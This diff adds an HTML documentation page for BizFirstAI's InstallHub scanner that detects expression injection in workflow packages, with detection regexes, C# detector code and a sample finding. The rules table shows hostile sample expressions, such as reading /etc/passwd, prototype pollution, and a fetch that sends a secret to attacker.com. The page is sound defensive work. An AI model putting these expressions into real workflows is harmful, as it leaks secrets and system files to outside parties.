@@ -1,0 +1,170 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Expression Injection Detection — Security Scanning | BizFirstAI</title>
+<link rel="stylesheet" href="../shared.css">
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.1/css/all.min.css">
+<style>
+.bfai-topbar-logo img{height:26px;display:block;}.bfai-topbar{position:fixed;top:0;left:0;right:0;z-index:200;background:#1e2736;border-bottom:1px solid #2d3a4a;height:40px;display:flex;align-items:center;padding:0 20px;}
+.bfai-topbar-right{margin-left:auto;display:flex;gap:6px;}
+.bfai-topbar-right a{font-size:12px;color:#b0c4d8;text-decoration:none;padding:4px 12px;border-radius:5px;display:flex;align-items:center;gap:6px;transition:background 0.15s,color 0.15s;}
+.bfai-topbar-right a:hover{background:rgba(255,255,255,0.08);color:#fff;}
+body{padding-top:40px;}
+</style>
+</head>
+<body>
+<div class="bfai-topbar">
+  <a href="https://bizfirstai.com" target="_blank" class="bfai-topbar-logo">
+    <img src="../../../images/icons/BizFirstAiFull.png" alt="BizFirstAI">
+  </a>
+  <div class="bfai-topbar-right">
+    <a href="https://bizfirstai.github.io/UserGuides/" target="_top"><i class="fa-solid fa-house"></i> Portal</a>
+    <a href="https://community.bizfirstai.com" target="_blank"><i class="fa-solid fa-people-group"></i> Community</a>
+  </div>
+</div>
+<div class="layout">
+<nav class="sidebar">
+  <div class="logo">
+    <h2>InstallHub</h2>
+    <h1>Security Scanning</h1>
+  </div>
+  <div class="section-label">Pages</div>
+  <a href="index.html">Overview</a>
+  <a href="01-expression-injection.html" class="active">Expression Injection Detection</a>
+  <a href="02-sql-injection.html">SQL Injection Detection</a>
+  <a href="03-dependency-vulnerability.html">Dependency Vulnerability Scan</a>
+  <a href="04-content-policy.html">Content Policy Check</a>
+  <a href="05-scan-results.html">Scan Results</a>
+  <a href="06-false-positives.html">Handling False Positives</a>
+  <a href="07-manual-review.html">Manual Security Review</a>
+  <div class="section-label">Navigation</div>
+  <a href="https://bizfirstai.github.io/UserGuides/" target="_top">&#8592; Back to Portal</a>
+</nav>
+<main class="content">
+  <div class="page-header">
+    <div class="tag">InstallHub</div>
+    <h1>Expression Injection Detection</h1>
+    <p class="lead">Expression injection attacks embed malicious logic inside workflow node configuration fields that get evaluated at runtime. The expression injection detector scans all expression-type fields across every artifact in the package.</p>
+  </div>
+
+  <h2>Why Expression Fields Are Dangerous</h2>
+  <p>BizFirstGO workflow nodes accept expression strings in configuration fields. These expressions are evaluated during process execution with access to the execution context — including process variables, form data, and in some contexts, system configuration. A malicious expression can:</p>
+  <ul>
+    <li>Read environment variables and exfiltrate secrets via HTTP callback nodes</li>
+    <li>Access <code>__proto__</code> or <code>constructor</code> chains to pollute JavaScript objects</li>
+    <li>Invoke unsafe functions to read filesystem paths or execute arbitrary code</li>
+    <li>Create infinite loops that exhaust tenant execution quotas</li>
+  </ul>
+
+  <h2>Expression Fields Scanned</h2>
+  <table>
+    <thead>
+      <tr><th>Artifact Type</th><th>Expression Fields</th></tr>
+    </thead>
+    <tbody>
+      <tr><td>ProcessDefinition</td><td><code>nodes[*].config.expression</code>, <code>nodes[*].config.condition</code>, <code>nodes[*].config.valueMapping</code></td></tr>
+      <tr><td>ThreadDefinition</td><td><code>steps[*].expression</code>, <code>steps[*].conditionExpression</code></td></tr>
+      <tr><td>RuleSet</td><td><code>rules[*].condition</code>, <code>rules[*].action.expression</code></td></tr>
+      <tr><td>AtlasForm</td><td><code>fields[*].validationExpression</code>, <code>fields[*].visibilityExpression</code></td></tr>
+    </tbody>
+  </table>
+
+  <h2>Detection Rules</h2>
+  <table>
+    <thead>
+      <tr><th>Rule</th><th>Pattern</th><th>Severity</th><th>Example</th></tr>
+    </thead>
+    <tbody>
+      <tr><td><code>EnvironmentVariableAccess</code></td><td><code>env\.\w+</code> or <code>process\.env</code></td><td>Critical</td><td><code>{{env.DATABASE_URL}}</code></td></tr>
+      <tr><td><code>PrototypePollution</code></td><td><code>__proto__</code>, <code>constructor\.prototype</code></td><td>Critical</td><td><code>obj.__proto__.isAdmin = true</code></td></tr>
+      <tr><td><code>EvalCall</code></td><td><code>\beval\s*\(</code>, <code>Function\s*\(</code></td><td>Critical</td><td><code>eval("malicious code")</code></td></tr>
+      <tr><td><code>UnsafeFunctionCall</code></td><td><code>require\s*\(</code>, <code>import\s*\(</code></td><td>Critical</td><td><code>require('fs').readFileSync('/etc/passwd')</code></td></tr>
+      <tr><td><code>ExternalHttpCall</code></td><td>Hardcoded non-whitelisted HTTP URLs in expression context</td><td>High</td><td><code>fetch('https://attacker.com/exfil?d=' + secret)</code></td></tr>
+      <tr><td><code>InfiniteLoop</code></td><td><code>while\s*\(true\)</code>, unbounded recursion patterns</td><td>High</td><td><code>while(true) { /* do nothing */ }</code></td></tr>
+      <tr><td><code>GlobalScopeAccess</code></td><td><code>\bglobal\b</code>, <code>\bwindow\b</code>, <code>\bglobalThis\b</code></td><td>Medium</td><td><code>global.adminOverride = true</code></td></tr>
+      <tr><td><code>DeepNesting</code></td><td>Expression AST depth &gt; 10 levels</td><td>Low</td><td>Deeply nested ternary chains</td></tr>
+    </tbody>
+  </table>
+
+  <h2>ExpressionInjectionDetector — How It Works</h2>
+  <pre><code>public class ExpressionInjectionDetector : ISecurityCheck
+{
+    // 1. Extract all expression fields from all artifacts
+    private IEnumerable&lt;ExpressionField&gt; ExtractExpressionFields(PackageBundle bundle)
+    {
+        foreach (var artifact in bundle.Artifacts)
+        {
+            foreach (var field in _expressionFieldRegistry.GetFieldsFor(artifact.Type))
+            {
+                var value = artifact.Data.SelectToken(field.JsonPath)?.ToString();
+                if (!string.IsNullOrEmpty(value))
+                    yield return new ExpressionField(artifact, field.JsonPath, value);
+            }
+        }
+    }
+
+    // 2. Parse each expression into an AST
+    // 3. Walk the AST applying each detection rule
+    // 4. Collect all findings — do not short-circuit (report all issues)
+    public Task&lt;IReadOnlyList&lt;ScanFinding&gt;&gt; CheckAsync(PackageBundle bundle, ...)
+    {
+        var findings = new List&lt;ScanFinding&gt;();
+        foreach (var expr in ExtractExpressionFields(bundle))
+        {
+            var ast = _parser.Parse(expr.Value);
+            foreach (var rule in _rules)
+            {
+                var match = rule.Evaluate(ast);
+                if (match.IsMatch)
+                    findings.Add(new ScanFinding
+                    {
+                        Check        = "ExpressionInjection",
+                        Severity     = rule.Severity,
+                        ArtifactType = expr.Artifact.Type,
+                        ArtifactName = expr.Artifact.Name,
+                        Field        = expr.JsonPath,
+                        Value        = expr.Value,
+                        Rule         = rule.Name,
+                        Message      = match.Message
+                    });
+            }
+        }
+        return Task.FromResult&lt;IReadOnlyList&lt;ScanFinding&gt;&gt;(findings);
+    }
+}</code></pre>
+
+  <h2>Finding Example</h2>
+  <pre><code>{
+  "check":        "ExpressionInjection",
+  "result":       "FAIL",
+  "severity":     "Critical",
+  "findings": [
+    {
+      "artifactType": "ProcessDefinition",
+      "artifactName": "EmployeeOnboarding",
+      "field":        "nodes[2].config.expression",
+      "value":        "{{env.DATABASE_PASSWORD}}",
+      "rule":         "EnvironmentVariableAccess",
+      "message":      "Expression accesses environment variable 'DATABASE_PASSWORD'. Environment variable access is not permitted in marketplace packages."
+    },
+    {
+      "artifactType": "RuleSet",
+      "artifactName": "ApprovalRules",
+      "field":        "rules[0].condition",
+      "value":        "obj.__proto__.bypass = true",
+      "rule":         "PrototypePollution",
+      "message":      "Expression contains prototype pollution pattern '__proto__'. This is a critical security issue."
+    }
+  ]
+}</code></pre>
+
+  <div class="page-nav">
+    <a href="index.html">&#8592; Overview</a>
+    <a href="02-sql-injection.html">Next: SQL Injection Detection &#8594;</a>
+  </div>
+</main>
+</div>
+</body>
+</html>
